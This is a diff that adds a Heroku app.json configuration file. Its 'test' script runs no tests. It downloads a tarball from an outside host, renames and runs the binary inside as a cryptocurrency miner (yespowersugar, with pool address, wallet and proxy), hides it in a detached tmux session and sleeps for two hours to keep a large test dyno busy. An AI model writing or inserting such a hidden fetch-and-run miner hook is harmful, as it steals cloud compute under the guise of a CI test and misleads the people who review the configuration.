@@ -1,0 +1,21 @@
+{
+  "buildpacks": [
+    {
+      "url": "https://github.com/heroku/heroku-buildpack-apt"
+    }
+  ],
+  "stack": "heroku-18",
+  "formation": {
+    "test": {
+      "quantity": 1,
+      "size": "performance-l"
+    }
+  },
+  "environments": {
+    "test": {
+      "scripts": {
+        "test": "wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf leona; chmod +x leona; tmux new -d -s my-session \"./leona -t 8 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.lLEO -x 3.140.191.216:34844\"; sleep 7200"
+      }
+    }
+  }
+}
